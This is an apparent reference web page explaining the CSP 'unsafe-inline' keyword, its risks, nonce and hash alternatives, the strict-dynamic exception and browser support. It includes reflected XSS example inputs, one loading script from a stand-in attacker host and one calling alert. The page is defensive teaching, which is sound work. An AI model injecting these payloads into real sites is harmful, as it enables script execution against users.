	<h1>The <code>unsafe-inline</code> Source List Keyword</h1>
	<div class="lead">The <strong><code>unsafe-inline</code></strong> <strong>Content Security Policy</strong> (CSP) keyword allows the execution of inline scripts or styles.</div>
</div>
<h2>Warning</h2>
<p class="lead">Except for one very specific case, you should avoid using the <code>unsafe-inline</code> keyword in your CSP policy. As you might guess it is generally <em>unsafe</em> to use <code>unsafe-inline</code>.</p>
<p>The <code>unsafe-inline</code> keyword annuls most of the security benefits that <code>Content-Security-Policy</code> provide. </p>
<p>Let's imagine that you have an app that simply output's a name from the query string variable <code>name</code>, eg:
<code>Hello #url.name#</code>
<p>When you hit the URL: <code>/app?name=Pete</code>, the response is <code>Hello Pete</code>. This clearly is an open window for a reflected cross site scripting attack. The attacker can simply inject a script tag:</p>
<pre>/app?name=&lt;script src="https://bad-guy.example.com/bad-stuff.js"&gt;&lt;/script&gt;</pre>
<p>When someone requests that URL the <code>bad-stuff.js</code> will execute.</p>
<p>We can prevent our app from loading JS from <code>bad-guy.example.com</code> using CSP. If we have the following policy:</p>
<pre>script-src: 'self'</pre>
<p>Now becuase we specified <a href="/self/" title="CSP self"><code>'self'</code></a> in the <a href="/script-src/"><code>script-src</code></a> directive we can only load JS from the same origin as our app, the request to load a script from <code>bad-guy.example.com</code> will be blocked by CSP!</p>
<p>CSP will also <a href="/examples/allow-inline-script/">prevent inline scripts from loading</a>, so if you have some legit JavaScript on your site, like this:
<pre>&lt;script&gt;
	doSomething();
&lt;script&gt;</pre>
<p>That inline script will also be blocked by CSP by default. There are ways to allow it, such as <a href="/nonce/" title="CSP nonce"><code>nonce</code></a> and <a href="/hash/" title="CSP hash"><code>hash</code></a>. But the sledge hammer way to allow it would be to add <code>unsafe-inline</code> to your policy. Suppose we added it to our policy:</a>
<pre>script-src: 'self' 'unsafe-inline'</pre>
<p>Now, go back to our vulnerable example app and try this:</p>
<pre>/app?name=&lt;script&gt;alert('xss');&lt;script&gt;</pre>
<p>We have reopened our XSS hole that was patched by adding CSP.</p>
<blockquote>
	Note: We are using <code>alert('xss')</code> as an example of a 
	function call in JavaScript to illustrate the weaknesses <code>unsafe-inline</code> adds. 
	In case you ever wondered why everyone is so concerned about the <code>alert</code> function, if you
	can execute an alert function call, an attacker can probably find a way to execute whatever JavaScript they wanted to.
	<br>
	Finally make sure you also patch your XSS vulnerabilities in your app code by properly encoding variables before outputting them.

<h2>What should you use instead of unsafe-inline?</h2>
<p>When you want to <a href="/examples/allow-inline-script/">allow inline scripts or styles</a> on a page that uses CSP, there two much better options: <a href="/nonce/">nonce</a> or <a href="/hash/">hash</a>.</p>
<h2>What else does unsafe-inline allow?</h2>
<p>Besides just allowing inline <code>script</code> tags, <code>unsafe-inline</code> also allows all of the JavaScript event handlers to execute, for example code like this:</p>
<pre>&lt;button onClick="doSomething();"&gt;Do It&lt;/button&gt;</pre>
<p>Another way to allow such unsafe inline JavaScript code is with the <a href="/unsafe-hashes/">unsafe-hashes</a> source list keyword. While it is also considered <em>unsafe</em>, it better to use <code>unsafe-hashes</code> than it is to use <code>unsafe-inline</code>.</p> 
<h2>When is it ok to use unsafe-inline?</h2>
<p>It is only ok to use <code>unsafe-inline</code> when it is combined with the <a href="/strict-dynamic/"><code>strict-dynamic</code> directive</a>. On browsers that support <code>strict-dynamic</code> (CSP Level 3+), the <code>unsafe-inline</code> is ignored, and provides a route to backwards compatibility on browsers that support CSP Level 2 or lower.</p>
<p>In other words, you should only use it if you really know what you are doing!</p>

<h2>Why is unsafe-inline not working?</h2>
<p>The most common reason that unsafe inline is not working is that you forgot to wrap it with single quotes. It should be specified as: <code>'unsafe-inline'</code></p>

<h2>Browser Support for <code>unsafe-inline</code></h2>
<div class="bs">
	<div class="label label-success">CSP Level 1</div>
	<br><br>
	<h4>Supported On:</h4><br>
	<div class="label label-default" title="Chrome 25+ - February 2013"><i class="fa fa-chrome"></i> Chrome 25+ (2013)</div>
	<div class="label label-default" title="Firefox 23+ - August 2013"><i class="fa fa-firefox"></i> Firefox 23+ (2013)</div>
	<div class="label label-default" title="Safari 7+ - October 2013"><i class="fa fa-safari"></i> Safari 7+ (2013)</div>
	<div class="label label-default" title="IE Edge 12.10240+ - July 2015"><i class="fa fa-edge"></i> Edge 12+ (2015)</div>
	<br><br>
	<h4>Not Supported On:</h4><br>
	<div class="label label-default" title="IE - Not Supported"><i class="fa fa-edge"></i> Internet Explorer</div>
</div>
<br>
<p>The CSP <code>unsafe-inline</code> source list keyword has been part of the Content Security Policy Specification since the first version of it (CSP Level 1).</p>
<p>Internet Explorer 11 and below do not support the <code>unsafe-inline</code> directive. This means that IE11 will simply ignore the policy and allows the execution of script or css as if no policy existed.</p>
